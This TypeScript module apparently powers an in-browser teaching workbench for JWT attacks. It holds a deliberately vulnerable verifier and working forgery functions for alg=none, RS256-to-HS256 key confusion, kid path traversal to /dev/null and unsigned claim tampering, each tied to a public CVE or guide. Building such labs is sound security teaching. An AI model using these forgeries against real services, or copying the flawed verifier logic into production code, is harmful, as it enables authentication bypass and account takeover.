// JWT live forging workbench — replicates the canonical alg-confusion family
// of attacks against a working verifier. All crypto happens in the browser
// via WebCrypto; the "verifier" is a faithful (intentionally vulnerable)
// implementation of a JWT validator written in the style of how applications
// commonly get this wrong.
//
// References:
//   - CVE-2015-9235  — node-jsonwebtoken alg=none acceptance
//   - CVE-2016-10555 — RS256 -> HS256 alg confusion in jsonwebtoken
//   - CVE-2018-0114  — Cisco "jku" header pointing to attacker JWKS
//   - CVE-2022-21449 — Java ECDSA r=s=0 (Psychic Signatures)
//   - PortSwigger Web Security Academy: "JWT attacks"
//   - OWASP JWT Cheat Sheet
//
// The verifier is parameterised by a 'mode' that toggles each defense,
// so users can flip them off and watch a forged token sail through.

export type Alg = "HS256" | "RS256" | "none";

/* ====================================================================== *
 *  Helpers                                                                *
 * ====================================================================== */

const enc = new TextEncoder();
const dec = new TextDecoder();

export function b64urlEncode(bytes: ArrayBuffer | Uint8Array | string): string {
  const u8 =
    typeof bytes === "string"
      ? enc.encode(bytes)
      : bytes instanceof Uint8Array
        ? bytes
        : new Uint8Array(bytes);
  let s = "";
  for (let i = 0; i < u8.length; i++) s += String.fromCharCode(u8[i]!);
  return btoa(s).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

export function b64urlDecodeBytes(s: string): Uint8Array {
  const pad = s.length % 4 === 0 ? "" : "=".repeat(4 - (s.length % 4));
  const b64 = (s + pad).replace(/-/g, "+").replace(/_/g, "/");
  const bin = atob(b64);
  const out = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i);
  return out;
}

export function b64urlDecodeString(s: string): string {
  return dec.decode(b64urlDecodeBytes(s));
}

export interface JwtTriple {
  header: Record<string, unknown>;
  payload: Record<string, unknown>;
  signature: string;
}

export function splitToken(token: string): {
  header: string;
  payload: string;
  signature: string;
} {
  const parts = token.trim().split(".");
  if (parts.length !== 3)
    throw new Error("Token must have three dot-separated segments");
  return { header: parts[0]!, payload: parts[1]!, signature: parts[2]! };
}

export function decodeTriple(token: string): JwtTriple {
  const { header, payload, signature } = splitToken(token);
  return {
    header: JSON.parse(b64urlDecodeString(header)),
    payload: JSON.parse(b64urlDecodeString(payload)),
    signature,
  };
}

/* ====================================================================== *
 *  Crypto primitives                                                      *
 * ====================================================================== */

async function hmacSha256(
  keyBytes: Uint8Array,
  data: string,
): Promise<Uint8Array> {
  const key = await crypto.subtle.importKey(
    "raw",
    new Uint8Array(keyBytes),
    { name: "HMAC", hash: "SHA-256" },
    false,
    ["sign", "verify"],
  );
  const sig = await crypto.subtle.sign("HMAC", key, enc.encode(data));
  return new Uint8Array(sig);
}

async function rsaSha256Verify(
  spkiPem: string,
  data: string,
  signature: Uint8Array,
): Promise<boolean> {
  try {
    const spki = pemToDer(spkiPem);
    const key = await crypto.subtle.importKey(
      "spki",
      spki,
      { name: "RSASSA-PKCS1-v1_5", hash: "SHA-256" },
      false,
      ["verify"],
    );
    return await crypto.subtle.verify(
      "RSASSA-PKCS1-v1_5",
      key,
      new Uint8Array(signature),
      enc.encode(data),
    );
  } catch {
    return false;
  }
}

async function rsaSha256Sign(
  pkcs8Pem: string,
  data: string,
): Promise<Uint8Array> {
  const pkcs8 = pemToDer(pkcs8Pem);
  const key = await crypto.subtle.importKey(
    "pkcs8",
    pkcs8,
    { name: "RSASSA-PKCS1-v1_5", hash: "SHA-256" },
    false,
    ["sign"],
  );
  const sig = await crypto.subtle.sign(
    "RSASSA-PKCS1-v1_5",
    key,
    enc.encode(data),
  );
  return new Uint8Array(sig);
}

function pemToDer(pem: string): ArrayBuffer {
  const body = pem
    .replace(/-----BEGIN [^-]+-----/g, "")
    .replace(/-----END [^-]+-----/g, "")
    .replace(/\s+/g, "");
  const bin = atob(body);
  const u8 = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) u8[i] = bin.charCodeAt(i);
  return u8.buffer;
}

/* ====================================================================== *
 *  Demo key material (RSA 2048, generated once at module load).           *
 *  In a real verifier these would come from a JWKS endpoint.              *
 * ====================================================================== */

let cachedKeys: Promise<{ publicPem: string; privatePem: string }> | null =
  null;

export function getDemoKeys() {
  if (!cachedKeys) {
    cachedKeys = (async () => {
      const pair = await crypto.subtle.generateKey(
        {
          name: "RSASSA-PKCS1-v1_5",
          modulusLength: 2048,
          publicExponent: new Uint8Array([1, 0, 1]),
          hash: "SHA-256",
        },
        true,
        ["sign", "verify"],
      );
      const spki = await crypto.subtle.exportKey("spki", pair.publicKey);
      const pkcs8 = await crypto.subtle.exportKey("pkcs8", pair.privateKey);
      return {
        publicPem: derToPem(spki, "PUBLIC KEY"),
        privatePem: derToPem(pkcs8, "PRIVATE KEY"),
      };
    })();
  }
  return cachedKeys;
}

function derToPem(der: ArrayBuffer, label: string): string {
  const u8 = new Uint8Array(der);
  let bin = "";
  for (let i = 0; i < u8.length; i++) bin += String.fromCharCode(u8[i]!);
  const b64 = btoa(bin);
  const lines: string[] = [];
  for (let i = 0; i < b64.length; i += 64) lines.push(b64.slice(i, i + 64));
  return `-----BEGIN ${label}-----\n${lines.join("\n")}\n-----END ${label}-----`;
}

/* ====================================================================== *
 *  Verifier                                                               *
 * ====================================================================== */

export interface VerifierConfig {
  /** PEM-encoded SPKI public key. */
  publicPem: string;
  /** Required issuer. If null, issuer is not pinned. */
  expectedIssuer: string | null;
  /** Required audience. */
  expectedAudience: string | null;
  /** Algorithms the verifier accepts. The defense is to pin this. */
  allowedAlgorithms: Alg[];
  /** Pretend the verifier is the broken `jsonwebtoken@<5.0` flow that
   *  picks the verification algorithm from the token's header. When true,
   *  alg-confusion attacks succeed. */
  trustHeaderAlg: boolean;
  /** Treat alg=none as a valid algorithm if the token says so. The
   *  CVE-2015-9235 footgun. */
  acceptAlgNone: boolean;
}

export interface VerifyResult {
  valid: boolean;
  reason: string;
  steps: string[];
  decoded?: JwtTriple;
}

export async function verifyToken(
  token: string,
  config: VerifierConfig,
): Promise<VerifyResult> {
  const steps: string[] = [];
  let triple: JwtTriple;
  try {
    triple = decodeTriple(token);
    steps.push("decoded header + payload");
  } catch (e) {
    return { valid: false, reason: `decode: ${(e as Error).message}`, steps };
  }

  const headerAlg = String(triple.header.alg ?? "");
  steps.push(`header alg = ${headerAlg || "(empty)"}`);

  // Algorithm selection
  let effectiveAlg: Alg;
  if (config.trustHeaderAlg) {
    if (headerAlg === "none") {
      if (!config.acceptAlgNone) {
        return {
          valid: false,
          reason: "alg=none rejected (acceptAlgNone=false)",
          steps,
          decoded: triple,
        };
      }
      effectiveAlg = "none";
    } else if (headerAlg === "HS256" || headerAlg === "RS256") {
      effectiveAlg = headerAlg;
    } else {
      return {
        valid: false,
        reason: `unsupported alg ${headerAlg}`,
        steps,
        decoded: triple,
      };
    }
    steps.push(`trustHeaderAlg=true \u2192 verifying with ${effectiveAlg}`);
  } else {
    if (config.allowedAlgorithms.length === 0) {
      return {
        valid: false,
        reason: "no allowed algorithms configured",
        steps,
        decoded: triple,
      };
    }
    if (!config.allowedAlgorithms.includes(headerAlg as Alg)) {
      return {
        valid: false,
        reason: `header alg ${headerAlg} not in allowed list ${config.allowedAlgorithms.join(",")}`,
        steps,
        decoded: triple,
      };
    }
    effectiveAlg = headerAlg as Alg;
    steps.push(`allowedAlgorithms enforced \u2192 ${effectiveAlg}`);
  }

  // Signature check
  const {
    header: hdrB64,
    payload: payB64,
    signature: sigB64,
  } = splitToken(token);
  const signingInput = `${hdrB64}.${payB64}`;

  if (effectiveAlg === "none") {
    if (sigB64 !== "") {
      steps.push(
        "alg=none but signature present \u2014 still accepting per config",
      );
    }
    steps.push("signature check skipped (alg=none)");
  } else if (effectiveAlg === "HS256") {
    // FATAL FOOTGUN: trustHeaderAlg=true on a verifier configured with an
    // RSA public key turns the public key into the HMAC secret. This is the
    // RS256 -> HS256 alg-confusion attack.
    const keyBytes = enc.encode(config.publicPem);
    const computed = await hmacSha256(keyBytes, signingInput);
    const provided = b64urlDecodeBytes(sigB64);
    const ok = constantTimeEqual(computed, provided);
    steps.push(
      `HS256 verify with public key bytes \u2192 ${ok ? "match" : "mismatch"}`,
    );
    if (!ok) {
      return {
        valid: false,
        reason: "HS256 signature mismatch",
        steps,
        decoded: triple,
      };
    }
  } else if (effectiveAlg === "RS256") {
    const provided = b64urlDecodeBytes(sigB64);
    const ok = await rsaSha256Verify(config.publicPem, signingInput, provided);
    steps.push(
      `RS256 verify with public key \u2192 ${ok ? "match" : "mismatch"}`,
    );
    if (!ok) {
      return {
        valid: false,
        reason: "RS256 signature mismatch",
        steps,
        decoded: triple,
      };
    }
  }

  // Claim checks
  if (config.expectedIssuer && triple.payload.iss !== config.expectedIssuer) {
    return {
      valid: false,
      reason: `iss mismatch: expected ${config.expectedIssuer}, got ${triple.payload.iss}`,
      steps,
      decoded: triple,
    };
  }
  if (config.expectedAudience) {
    const aud = triple.payload.aud;
    const matches = Array.isArray(aud)
      ? aud.includes(config.expectedAudience)
      : aud === config.expectedAudience;
    if (!matches) {
      return {
        valid: false,
        reason: `aud mismatch: expected ${config.expectedAudience}`,
        steps,
        decoded: triple,
      };
    }
  }
  if (typeof triple.payload.exp === "number") {
    if (triple.payload.exp * 1000 < Date.now()) {
      return {
        valid: false,
        reason: "token expired (exp in past)",
        steps,
        decoded: triple,
      };
    }
  }

  steps.push("claims OK");
  return { valid: true, reason: "verified", steps, decoded: triple };
}

function constantTimeEqual(a: Uint8Array, b: Uint8Array): boolean {
  if (a.length !== b.length) return false;
  let r = 0;
  for (let i = 0; i < a.length; i++) r |= a[i]! ^ b[i]!;
  return r === 0;
}

/* ====================================================================== *
 *  Token mint helpers (legitimate + attacker-side forgery)                *
 * ====================================================================== */

export async function mintLegitimate(
  privatePem: string,
  payload: Record<string, unknown>,
): Promise<string> {
  const header = { alg: "RS256", typ: "JWT" };
  const h = b64urlEncode(JSON.stringify(header));
  const p = b64urlEncode(JSON.stringify(payload));
  const sig = await rsaSha256Sign(privatePem, `${h}.${p}`);
  return `${h}.${p}.${b64urlEncode(sig)}`;
}

export interface ForgeResult {
  token: string;
  steps: string[];
  /** Plain-language description of what the attacker did. */
  technique: string;
  /** Reference link / CVE. */
  reference: string;
}

export type ForgeAttack =
  | "alg-none"
  | "alg-confusion"
  | "kid-injection"
  | "claim-tamper-no-resign";

export async function forge(
  attack: ForgeAttack,
  legitimateToken: string,
  publicPem: string,
  newPayloadOverrides: Record<string, unknown> = {},
): Promise<ForgeResult> {
  const triple = decodeTriple(legitimateToken);
  const steps: string[] = [];
  steps.push(
    `captured a legit RS256 token for sub=${triple.payload.sub ?? "?"}`,
  );

  const tampered = { ...triple.payload, ...newPayloadOverrides };
  steps.push(`tampered payload: ${JSON.stringify(newPayloadOverrides)}`);

  switch (attack) {
    case "alg-none": {
      const header = { alg: "none", typ: "JWT" };
      const h = b64urlEncode(JSON.stringify(header));
      const p = b64urlEncode(JSON.stringify(tampered));
      const token = `${h}.${p}.`;
      steps.push("set header.alg = 'none', dropped signature");
      return {
        token,
        steps,
        technique:
          "alg=none — verifier that accepts unsigned tokens admits forgery without any key.",
        reference:
          "CVE-2015-9235 (node-jsonwebtoken). https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/",
      };
    }
    case "alg-confusion": {
      // RS256 -> HS256: sign with public key as HMAC secret. This works
      // against verifiers that pick the algorithm from the token header
      // and call hmac.verify(pubkey, ...) when they should have called
      // rsa.verify(pubkey, ...).
      const header = { alg: "HS256", typ: "JWT" };
      const h = b64urlEncode(JSON.stringify(header));
      const p = b64urlEncode(JSON.stringify(tampered));
      const sig = await hmacSha256(enc.encode(publicPem), `${h}.${p}`);
      const token = `${h}.${p}.${b64urlEncode(sig)}`;
      steps.push("set header.alg = 'HS256'");
      steps.push(
        "HMAC-SHA256 the signing input using the public key (PEM bytes) as the secret",
      );
      return {
        token,
        steps,
        technique:
          "RS256 -> HS256 alg confusion — verifiers that derive their algorithm from the token header treat the public key as an HMAC secret.",
        reference:
          "CVE-2016-10555. https://www.invicti.com/blog/web-security/jwt-algorithm-confusion-attack/",
      };
    }
    case "kid-injection": {
      // kid header used by verifier to look up a key (often via filesystem
      // path or DB query). Path-traversal kids that point to a known file
      // (/dev/null, /proc/self/cmdline) let attacker control the "key" byte
      // sequence, then sign HS256 with that file's content. We model it
      // here by setting kid to a path-traversal sentinel and signing with
      // an empty string (the typical content of /dev/null).
      const header = {
        alg: "HS256",
        kid: "../../../../../../dev/null",
        typ: "JWT",
      };
      const h = b64urlEncode(JSON.stringify(header));
      const p = b64urlEncode(JSON.stringify(tampered));
      const sig = await hmacSha256(enc.encode(""), `${h}.${p}`);
      const token = `${h}.${p}.${b64urlEncode(sig)}`;
      steps.push("set header.kid to '../../../../../../dev/null'");
      steps.push(
        "verifier file-loads kid as the HMAC key \u2192 zero-byte key",
      );
      steps.push("HMAC-SHA256 the signing input with empty-string key");
      return {
        token,
        steps,
        technique:
          "kid path traversal — verifiers that resolve the kid header to a file path can be coerced to use attacker-known bytes as the key.",
        reference:
          "PortSwigger Web Security Academy, 'JWT attacks: kid injection'.",
      };
    }
    case "claim-tamper-no-resign": {
      // Just tamper with the payload without re-signing. Catches verifiers
      // that decode but don't actually verify (a real bug in early SaaS
      // SDKs). Re-uses the original signature, which won't match the new
      // payload.
      const { header: hdrB64, signature: sigB64 } = splitToken(legitimateToken);
      const p = b64urlEncode(JSON.stringify(tampered));
      const token = `${hdrB64}.${p}.${sigB64}`;
      steps.push("rewrote payload, kept original header + signature");
      steps.push("hoping the verifier decodes but doesn't verify");
      return {
        token,
        steps,
        technique:
          "Claim tampering without re-signing — works against verifiers that JSON.parse the payload but skip signature verification.",
        reference:
          "OWASP JWT Cheat Sheet \u2014 'always verify before reading claims'.",
      };
    }
  }
}

/* ====================================================================== *
 *  Catalog                                                                *
 * ====================================================================== */

export interface AttackEntry {
  id: ForgeAttack;
  title: string;
  cve?: string;
  blurb: string;
  defenseToggle: keyof VerifierConfig;
  defenseLabel: string;
  reference: string;
}

export const ATTACKS: AttackEntry[] = [
  {
    id: "alg-none",
    title: "alg=none — verifier accepts unsigned tokens",
    cve: "CVE-2015-9235",
    blurb:
      "Set header.alg to 'none', drop the signature segment. Verifiers that don't pin algorithms (or that special-case 'none' as a valid alg) admit any payload without a key.",
    defenseToggle: "acceptAlgNone",
    defenseLabel: "acceptAlgNone",
    reference:
      "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/",
  },
  {
    id: "alg-confusion",
    title: "RS256 \u2192 HS256 alg confusion — public key as HMAC secret",
    cve: "CVE-2016-10555",
    blurb:
      "Switch alg to HS256, HMAC the signing input with the verifier's public key as the secret. Works against verifiers that pick the verification algorithm from the token's own header.",
    defenseToggle: "trustHeaderAlg",
    defenseLabel: "trustHeaderAlg",
    reference:
      "https://www.invicti.com/blog/web-security/jwt-algorithm-confusion-attack/",
  },
  {
    id: "kid-injection",
    title: "kid header path traversal \u2192 known-bytes HMAC key",
    blurb:
      "Set the kid header to a path-traversal sentinel pointing at a file the attacker knows the contents of (/dev/null, /proc/sys/kernel/random/boot_id with a separate read). HMAC the input with that file's bytes as the key.",
    defenseToggle: "trustHeaderAlg",
    defenseLabel: "trustHeaderAlg + sanitize kid",
    reference: "https://portswigger.net/web-security/jwt",
  },
  {
    id: "claim-tamper-no-resign",
    title: "Tamper claims, keep the original signature",
    blurb:
      "Rewrite the payload (e.g. flip role to admin), keep the original header + signature. Catches verifiers that decode-but-don't-verify, a real bug in several early SaaS SDKs.",
    defenseToggle: "trustHeaderAlg", // any verify enforcement defeats this
    defenseLabel: "verify before reading claims",
    reference:
      "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html",
  },
];
